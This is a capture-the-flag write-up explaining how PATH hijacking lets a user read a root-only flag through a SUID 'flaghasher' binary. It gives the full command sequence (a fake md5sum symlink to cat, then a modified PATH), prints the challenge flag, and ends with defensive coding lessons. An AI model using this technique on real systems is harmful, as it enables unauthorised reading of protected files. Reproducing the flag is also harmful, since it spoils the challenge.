# Path Hijacking for SUID Exploitation - CTF Write-up

## Challenge Overview
The challenge involves a SUID binary named "flaghasher" that runs with root privileges to calculate the MD5 hash of a protected file `/root/flag.txt`, which normal users cannot access directly.

## Vulnerability Analysis
After analyzing the decompiled code, I identified that:

1. The program sets its privileges to root (`setgid(0)` and `setuid(0)`)
2. It executes the command `/bin/bash -c 'md5sum /root/flag.txt'` using `system()`
3. The critical vulnerability is that it calls `md5sum` without specifying the full path

## Exploitation Method: PATH Hijacking
The vulnerability allows for a classic PATH hijacking attack:

1. The program calls `md5sum` using a relative path
2. When a program doesn't use absolute paths, the system searches for executables in directories listed in the PATH environment variable
3. By manipulating this search path, we can trick the program into executing our own version of `md5sum`

## Step-by-Step Exploitation

### 1. Create a personal bin directory
```bash
mkdir -p ~/bin
```

### 2. Create a fake md5sum that actually runs cat
```bash
ln -s /bin/cat ~/bin/md5sum
```
This symlink means when `md5sum` is called, it will actually execute the `cat` command.

### 3. Modify the PATH environment variable
```bash
export PATH=~/bin:$PATH
```
This prepends our personal bin directory to the PATH, so the system will look there first when searching for executables.

### 4. Verify the PATH modification worked
```bash
which md5sum
```
Output: `/home/ctf-player/bin/md5sum`

### 5. Execute the vulnerable SUID binary
```bash
./flaghasher
```

### 6. Result
Instead of calculating the MD5 hash, our hijacked `md5sum` actually runs `cat` on `/root/flag.txt`, displaying:
```
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_9722baa4}
```

## Security Lessons
1. Always use absolute paths when executing commands in privileged programs
2. Be cautious with the `system()` function in SUID programs
3. Consider using more secure alternatives like `execve()` that don't rely on shell interpretation
4. For developers: sanitize the environment before executing privileged operations

This type of vulnerability is common in CTF challenges and demonstrates fundamental principles of privilege escalation in Unix-like systems.